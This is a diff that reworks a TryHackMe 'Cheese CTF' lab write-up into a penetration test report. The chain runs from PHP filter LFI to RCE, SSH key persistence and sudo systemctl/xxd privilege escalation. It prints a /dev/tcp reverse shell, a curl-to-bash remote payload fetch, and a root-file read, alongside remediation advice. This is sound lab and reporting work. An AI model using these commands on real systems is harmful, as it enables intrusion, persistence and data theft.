@@ -1,292 +1,265 @@
-# Cheese CTF — TryHackMe Writeup
+# Cheese CTF — Penetration Test Report
 
-### Lab Info
-```
-Room: Cheese CTF  
-Platform: TryHackMe  
-Difficulty: Medium  
-Type: Web → RCE → Privilege Escalation  
-```
----
+## Objective and Scope
 
-## Overview
+The objective of this assessment was to evaluate the security posture of the **Cheese CTF** target machine (TryHackMe), identifying and exploiting vulnerabilities across the web application layer, SSH configuration, and host privilege model to achieve full system compromise.
 
-Cheese CTF is a web-based machine that involves:
+## Scope of Work
 
-- Web enumeration
-- PHP filter exploitation
-- Remote Code Execution (RCE)
-- SSH misconfiguration abuse
-- Systemd timer privilege escalation
-- GTFOBins abuse (xxd)
+**In-Scope Assets:**
+- **Host:** `cheese.thm`
+- **Services:** Web application (HTTP), SSH
+- **Testing Perspective:** Unauthenticated external attacker
 
 ---
-## Tools Used
 
-* dirsearch
-* netcat
-* python http.server
-* php_filter_chain_generator
-* GTFOBins
----
 ## Enumeration
 
-### Web Enumeration Checklist
+### Web Enumeration
 
-- Directory brute forcing (dirsearch)
-- Checking `robots.txt`
-- Viewing page source
-- Testing for virtual hosts
-- Parameter testing
-
-### Directory Discovery
-
-Using dirsearch:
-
-```bash
-dirsearch -u http://cheese.thm
-````
-
-Discovered:
+Directory brute-forcing with `dirsearch` identified:
 
 ```
 /messages.html
 ```
 
-While browsing, found:
+Manual review of `messages.html` revealed a reference to:
 
 ```
 secret-script.php?file=
 ```
 
-This parameter looked suspicious and hinted at **Local File Inclusion (LFI)**.
+The `file` parameter accepted arbitrary input, indicating a possible Local File Inclusion (LFI) point.
+
+### Tools Used
+- dirsearch
+- php_filter_chain_generator
+- netcat
+- python http.server
 
 ---
 
-## PHP Filter Exploitation
+## Vulnerabilities
 
-Opening:
-
-```
-http://cheese.thm/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
-```
-
-The application allowed use of:
-
-```
-php://filter
-```
-
-This confirmed we could abuse PHP filter chains.
+| Vulnerability | Severity | Impact |
+|---|---|---|
+| Local File Inclusion via `php://filter` | High | Source code/data disclosure, foothold for RCE |
+| PHP Filter Chain Remote Code Execution | Critical | Full remote code execution as web service user |
+| Writable SSH `authorized_keys` | Critical | Persistent unauthorized SSH access |
+| Privilege Escalation via Misconfigured `sudo systemctl` + GTFOBins | Critical | Root-level command execution |
 
 ---
 
-## Generating PHP Filter Chains
+### Local File Inclusion via `php://filter`
 
-Used the tool:
+#### Severity
+High
 
-* **php_filter_chain_generator**
-* Repository: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
+#### CWE
+CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program
 
-### Test Payload (phpinfo)
+#### OWASP Category
+OWASP Top 10 2021 – A03: Injection
 
-```bash
-python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
+#### Description
+The `secret-script.php` endpoint accepts a `file` parameter that is passed directly to a PHP include/file-read function without validation. This allows the use of PHP stream wrappers, specifically `php://filter`, to read arbitrary file contents on the server.
+
+#### Affected Functionality
+- `secret-script.php?file=`
+
+#### Steps to Reproduce
+1. Request `secret-script.php?file=php://filter/resource=<target>`.
+2. Observe that the application returns the contents of the requested resource rather than an error.
+
+#### Proof of Concept
 ```
+GET /secret-script.php?file=php://filter/resource=supersecretmessageforadmin
+```
+Response returned the contents of the targeted resource, confirming the `php://filter` wrapper was processed by the application.
 
-Sending this payload confirmed execution — meaning **RCE was possible**.
+#### Impact
+- Disclosure of application source code and sensitive files
+- Provides the foundation for filter-chain based code execution (see next finding)
+
+#### Root Cause
+User-supplied input is passed directly into a file-inclusion sink without validating against an allow-list of expected files or disabling PHP stream wrappers.
+
+#### Recommendation
+- Never pass user input directly to `include`/`require`/file-read functions
+- Use an allow-list of permitted filenames mapped via an internal identifier
+- Disable `allow_url_include` and restrict usable PHP stream wrappers
+- Apply input validation and reject path/wrapper syntax (`php://`, `../`, etc.)
+
+#### References
+- OWASP Top 10 2021 – A03: Injection
+- CWE-98
 
 ---
 
-## Remote Code Execution
+### PHP Filter Chain Remote Code Execution
 
+#### Severity
+Critical
 
-### Create reverse shell file (attacker machine)
+#### CWE
+CWE-94: Improper Control of Generation of Code ('Code Injection')
 
-File: `rce.py`
+#### OWASP Category
+OWASP Top 10 2021 – A03: Injection
 
-```bash
-bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
-```
+#### Description
+Because the application processes `php://filter` chains on attacker-controlled input, it is possible to craft a filter chain that converts an attacker-supplied string into executable PHP code, which the application then evaluates. Using the `php_filter_chain_generator` tool, a chain was generated that fetched and executed a remote shell script, resulting in remote code execution.
 
----
+#### Affected Functionality
+- `secret-script.php?file=` (same sink as the LFI finding)
 
-### Generate PHP filter chain for RCE
+#### Steps to Reproduce
+1. Generate a PHP filter chain payload that, when decoded by the PHP filter stack, produces executable PHP code:
+   ```bash
+   python3 php_filter_chain_generator.py --chain '<?= `curl -s -L <attacker_ip>/rce.py|bash` ?>'
+   ```
+2. Host a reverse-shell payload (`rce.py`) on an attacker-controlled web server.
+3. Start a netcat listener on the attacker machine.
+4. Submit the generated filter chain as the `file` parameter to `secret-script.php`.
 
-```bash
-python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.0.0.1/rce.py|bash` ?>'
-```
+#### Proof of Concept
+Submitting the generated filter chain resulted in the target server retrieving and executing the hosted payload, producing an interactive reverse shell on the attacker's listener.
 
-> `<?= ?>` is shorthand for `<?php echo ?>`
+#### Impact
+- Full remote code execution in the context of the web service account
+- Establishes initial foothold on the host, enabling further lateral movement and privilege escalation
 
----
+#### Root Cause
+Combination of unrestricted `php://filter` wrapper usage and evaluation of filter output as executable PHP code, with no input sanitization or sandboxing of the file-inclusion sink.
 
-### Start listeners
+#### Recommendation
+- Remediate the underlying LFI (see previous finding) — this is the primary fix
+- Disable PHP filter chain wrappers where file inclusion is required
+- Run the web application with a restricted, least-privilege OS account
+- Apply egress filtering to prevent the application server from making outbound requests to arbitrary hosts
 
-Terminal 1:
-
-```bash
-python3 -m http.server 8000
-```
-
-Terminal 2:
-
-```bash
-nc -nvlp 4444
-```
-
----
-
-### Send payload
-
-Injected generated filter chain into:
-
-```
-messages.html → secret-script.php
-```
-
-#### Got reverse shell.
+#### References
+- OWASP Top 10 2021 – A03: Injection
+- CWE-94
+- [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
 
 ---
 
-## SSH Misconfiguration
+### Writable SSH `authorized_keys`
 
-While exploring the system:
+#### Severity
+Critical
 
-```
-/home/comte/.ssh/
-```
+#### CWE
+CWE-732: Incorrect Permission Assignment for Critical Resource
 
-Found:
+#### OWASP Category
+OWASP Top 10 2021 – A05: Security Misconfiguration
 
-```
-authorized_keys (writable)
-```
+#### Description
+Following the initial foothold, the `~/.ssh/authorized_keys` file for the user `comte` was found to be writable by the compromised web service account. An attacker can append their own SSH public key to this file to gain persistent, password-less SSH access as `comte`.
 
-This is a critical misconfiguration.
+#### Affected Functionality
+- `/home/comte/.ssh/authorized_keys`
 
----
+#### Steps to Reproduce
+1. From the initial foothold shell, check permissions on `/home/comte/.ssh/authorized_keys`.
+2. Append an attacker-controlled SSH public key to the file.
+3. Connect via SSH using the corresponding private key:
+   ```bash
+   ssh comte@cheese.thm -i <attacker_private_key>
+   ```
 
-### Add Attacker SSH Key
+#### Proof of Concept
+SSH login as `comte` succeeded using the attacker-supplied key, with no password required, confirming the file was writable and trusted by `sshd`.
 
-Added attacker public key to:
+#### Impact
+- Persistent unauthorized access to the `comte` account independent of any password
+- Provides a stable foothold for further privilege escalation
 
-```
-/home/comte/.ssh/authorized_keys
-```
+#### Root Cause
+Incorrect file permissions on a security-critical configuration file allow modification by a lower-privileged or compromised account.
 
-Then connected via SSH:
+#### Recommendation
+- Restrict `~/.ssh/authorized_keys` to be writable only by its owning user (`chmod 600`)
+- Audit file and directory permissions across the filesystem for unintended write access by service accounts
+- Monitor `authorized_keys` files for unexpected modifications
 
-```bash
-ssh comte@cheese.thm
-```
-
-Successfully logged in as user `comte`.
-
----
-
-## User Flag
-
-Inside home directory:
-
-```bash
-cat user.txt
-```
-
----
-
-## Privilege Escalation
-
-### Step 1: Check sudo permissions
-
-```bash
-sudo -l
-```
-
-Output:
-
-```
-(ALL) NOPASSWD: /bin/systemctl daemon-reload
-(ALL) NOPASSWD: /bin/systemctl restart exploit.timer
-(ALL) NOPASSWD: /bin/systemctl start exploit.timer
-(ALL) NOPASSWD: /bin/systemctl enable exploit.timer
-```
-
-This is a major misconfiguration.
+#### References
+- OWASP Top 10 2021 – A05: Security Misconfiguration
+- CWE-732
 
 ---
 
-### Step 2: Investigate systemd timer
+### Privilege Escalation via Misconfigured `sudo systemctl` and GTFOBins (`xxd`)
 
-Location:
+#### Severity
+Critical
 
-```
-/etc/systemd/system/exploit.timer
-```
+#### CWE
+CWE-269: Improper Privilege Management
 
-Contents:
+#### OWASP Category
+OWASP Top 10 2021 – A05: Security Misconfiguration
 
-```ini
-[Unit]
-Description=Exploit Timer
+#### Description
+The `comte` user was permitted to run specific `systemctl` commands as root without a password (`NOPASSWD`), including control over a custom `exploit.timer` systemd unit. The timer unit's associated job executed a binary (`xxd`) that is documented in GTFOBins as exploitable to read arbitrary files. By modifying the timer to fire quickly and triggering it via the permitted `sudo systemctl` commands, the attacker was able to use `xxd` to read the root flag.
 
-[Timer]
-OnBootSec=5s
+#### Affected Functionality
+- `sudo systemctl daemon-reload`
+- `sudo systemctl restart/start/enable exploit.timer`
+- `/opt/xxd`
 
-[Install]
-WantedBy=timers.target
-```
+#### Steps to Reproduce
+1. Run `sudo -l` to enumerate allowed commands:
+   ```
+   (ALL) NOPASSWD: /bin/systemctl daemon-reload
+   (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
+   (ALL) NOPASSWD: /bin/systemctl start exploit.timer
+   (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
+   ```
+2. Inspect `/etc/systemd/system/exploit.timer` and modify its trigger interval to fire quickly.
+3. Reload and restart the timer using the permitted `sudo systemctl` commands.
+4. Use the `/opt/xxd` binary (GTFOBins technique) to read a root-owned file:
+   ```bash
+   ./xxd "/root/root.txt" | xxd -r
+   ```
 
-Modified the timer to execute quickly (5 seconds).
+#### Proof of Concept
+The contents of `/root/root.txt` were successfully read by a non-root user via the `xxd` GTFOBins technique, triggered through the permitted `sudo systemctl` commands.
 
-Reloaded daemon:
+#### Impact
+- Full privilege escalation to root-equivalent file read/write access
+- Complete compromise of host confidentiality and integrity
 
-```bash
-sudo systemctl daemon-reload
-sudo systemctl restart exploit.timer
-```
+#### Root Cause
+Overly broad `sudo` permissions combined with a custom systemd unit invoking a binary with known privilege-escalation primitives (GTFOBins).
+
+#### Recommendation
+- Apply least privilege to `sudo` configuration — avoid granting `NOPASSWD` access to `systemctl` for units that execute attacker-influenceable binaries
+- Remove or restrict GTFOBins-listed binaries (`xxd` and similar) from systemd units running with elevated privileges
+- Regularly audit `sudoers` entries and custom systemd units for privilege escalation paths
+- Reference [GTFOBins](https://gtfobins.org/) during configuration review to identify dangerous binary/permission combinations
+
+#### References
+- OWASP Top 10 2021 – A05: Security Misconfiguration
+- CWE-269
+- [GTFOBins](https://gtfobins.org/)
 
 ---
 
-### Step 3: Investigate `/opt`
+## Attack Chain Summary
 
-Found suspicious binary:
+1. Discovered LFI via `secret-script.php?file=` using `php://filter`
+2. Escalated LFI to RCE using a PHP filter chain payload
+3. Gained initial foothold as the web service user
+4. Found writable `authorized_keys` for `comte` and established persistent SSH access
+5. Identified `sudo systemctl` misconfiguration tied to a custom systemd timer
+6. Abused GTFOBins technique on `xxd` via the timer to read root-owned files
 
-```
-/opt/xxd
-```
-
----
-
-## GTFOBins Exploit (xxd)
-
-Used:
-
-[https://gtfobins.org/](https://gtfobins.org/)
-
-Found that `xxd` can be abused.
-
-GTFOBins trick:
-
-```bash
-xxd /path/to/input-file | xxd -r
-```
-
-Modified to read root flag:
-
-```bash
-./xxd "/root/root.txt" | xxd -r
-```
----
 ## Key Takeaways
 
-* Always test for `php://filter` when LFI exists.
-* Writable `authorized_keys` = instant SSH persistence.
-* Misconfigured `sudo systemctl` can lead to privilege escalation.
-* GTFOBins is extremely useful during privesc.
-* Always enumerate `/opt`, `/etc/systemd`, and custom timers.
-
----
-
-
-
+- Always test `php://filter`-style wrappers when LFI is suspected
+- Writable `authorized_keys` files provide instant, password-less persistence
+- Custom systemd units combined with permissive `sudo` rules are a common privilege escalation vector
+- GTFOBins should be checked against any binary referenced in `sudoers` or systemd units running as root
